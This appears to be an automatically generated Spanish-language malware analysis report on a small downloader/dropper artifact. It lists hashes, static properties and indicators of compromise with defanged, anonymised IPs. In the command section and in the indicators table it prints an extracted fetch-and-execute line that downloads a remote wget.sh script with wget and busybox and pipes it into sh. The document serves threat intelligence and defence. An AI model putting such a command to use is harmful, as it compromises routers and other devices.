# 🧬 Payload Analysis

`81c3d2223c9820b687e28f399961fb8ed969bd1c46d7f684d2840429bfc8ea7b`

## 📌 Resumen

Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Ejecución. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:42:54+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `81c3d2223c9820b687e28f399961fb8ed969bd1c46d7f684d2840429bfc8ea7b`
- **MD5:** `910a8577889ccd5015f403f2b57b312d`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 320 B |
| Entropía | 5.14 |
| Strings | 6 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
{"cmd":"`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s 9router;busybox wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s 9
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 190.179.175.XXX | static_analysis |
| ip | 91.92.40.XXX | static_analysis |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| hash | 81c3d2223c9820b687e28f399961fb8ed969bd1c46d7f684d2840429bfc8ea7b | static_analysis |
| command | {"cmd":"`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s 9router;busybox wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s 9 | strings |
| ip | 45.156.87.XXX | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
